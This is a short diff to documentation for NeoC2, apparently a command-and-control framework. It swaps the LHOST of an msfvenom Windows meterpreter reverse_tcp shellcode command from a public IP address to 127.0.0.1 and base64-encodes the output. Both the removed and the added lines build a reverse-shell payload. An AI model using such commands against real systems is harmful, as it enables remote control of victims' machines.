@@ -457,7 +457,7 @@ NeoC2 provides advanced task chaining capabilities, allowing operators to create
 Generate shellcode with proper null byte avoidance and correct format:
 
 ```
-# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw -o shellcode.bin
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
 # Then base64 encode it before sending to the module
 base64 -w 0 shellcode.bin
 
